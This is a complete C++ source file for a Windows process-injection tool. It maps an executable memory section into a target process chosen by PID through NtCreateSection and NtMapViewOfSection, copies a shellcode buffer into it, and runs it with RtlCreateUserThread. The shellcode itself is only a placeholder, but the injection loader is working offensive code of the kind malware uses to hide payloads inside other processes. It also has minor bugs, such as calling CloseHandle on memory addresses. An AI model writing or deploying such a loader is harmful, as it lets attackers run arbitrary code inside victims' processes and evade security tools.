
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <winternl.h>


typedef NTSTATUS(NTAPI* pNtCreateSection)(
	OUT PHANDLE SectionHandle, 
	IN ULONG DesiredAccess, 
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, 
	IN PLARGE_INTEGER MaximumSize OPTIONAL, 
	IN ULONG PageAttributess, 
	IN ULONG SectionAttributes, 
	IN HANDLE FileHandle OPTIONAL
	);
typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect
	);
typedef NTSTATUS(NTAPI* pRtlCreateUserThread)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT CLIENT_ID *ClientID
	);

unsigned char shellcode[] = 
"Your shellcode";


BOOL section_inject(DWORD pid) 
{
	NTSTATUS status;
	HMODULE hNtdll;
	pNtCreateSection NtCreateSection;
	pNtMapViewOfSection NtMapViewOfSection;
	pRtlCreateUserThread RtlCreateUserThread;
	hNtdll = GetModuleHandleA("ntdll.dll");
	if (hNtdll == NULL) {
		printf("[-]LoadLibrary Failed\n");
		exit(1);
	}
	NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	RtlCreateUserThread = (pRtlCreateUserThread)GetProcAddress(hNtdll, "RtlCreateUserThread");
	// Create Section in Current Process Virtual Memory
	HANDLE hSection = NULL;
	SIZE_T size = sizeof(shellcode);
	LARGE_INTEGER sectionSize = { size };
	PVOID localSectionAddress = NULL;
	PVOID remoteSectionAddress = NULL;
	HANDLE hProcess = NULL;
	HANDLE tgtThreadHandle = NULL;
	// RWX
	status = NtCreateSection(
		&hSection,
		SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
		NULL,
		(PLARGE_INTEGER)&sectionSize,
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		NULL
	);
	if (NT_ERROR(status)) {
		printf("[-]NtCreateSection Failed, Error Code:%d\n", status);
		goto clean;
	}
	// try to MapViewOfSection
	status = NtMapViewOfSection(
		hSection,
		GetCurrentProcess(),
		&localSectionAddress,
		NULL,
		NULL,
		NULL,
		&size,
		2,
		NULL,
		PAGE_READWRITE
	);
	if (NT_ERROR(status)) {
		printf("[-]NtMapViewOfSection Failed, Error Code:%d\n", status);
		goto clean;
	}
	// try to create a view of the memory section in the target process
	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS,
		false,
		pid
	);
	if (hProcess == NULL)
	{
		printf("[-]OpenProcess Failed\n");
		goto clean;
	}
	status = NtMapViewOfSection(
		hSection,
		hProcess,
		&remoteSectionAddress,
		NULL,
		NULL,
		NULL,
		&size,
		2,
		NULL,
		PAGE_EXECUTE_READ
	);
	if (NT_ERROR(status)) {
		printf("[-]NtMapViewOfSection Failed, Error Code:%d\n", status);
		goto clean;
	}
	// try to copy shellcode to the local view, which will get reflected in the target process's mapped view
	memcpy(localSectionAddress, shellcode,sizeof(shellcode));
	
	// RtlCreateUserThread to run shellcode in target process
	status = RtlCreateUserThread(
		hProcess,
		NULL,
		FALSE,
		0,
		0,
		0,
		remoteSectionAddress,
		NULL,
		&tgtThreadHandle,
		NULL
	);

	if (NT_ERROR(status)) {
		printf("[-]RtlCreateUserThread Failed, Error Code:%d\n", status);
		goto clean;
	}
	return TRUE;

clean:
	if (tgtThreadHandle)
	{
		CloseHandle(tgtThreadHandle);
	}
	if(hProcess)
	{
		CloseHandle(hProcess);
	}
	if (hSection) 
	{
		CloseHandle(hSection);
	}
	if (localSectionAddress) 
	{
		CloseHandle(localSectionAddress);
	}
	if (remoteSectionAddress)
	{
		CloseHandle(remoteSectionAddress);
	}
	return FALSE;
}



int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		printf("[*]Usage: %s <pid>", argv[0]);
	}
	DWORD pid = (DWORD)atoi(argv[1]);
	if (section_inject(pid))
	{
		printf("[+]section_inject Success\n");
	}
	else
	{
		printf("[-]section_inject Failed\n");
	}
	return 0;
}

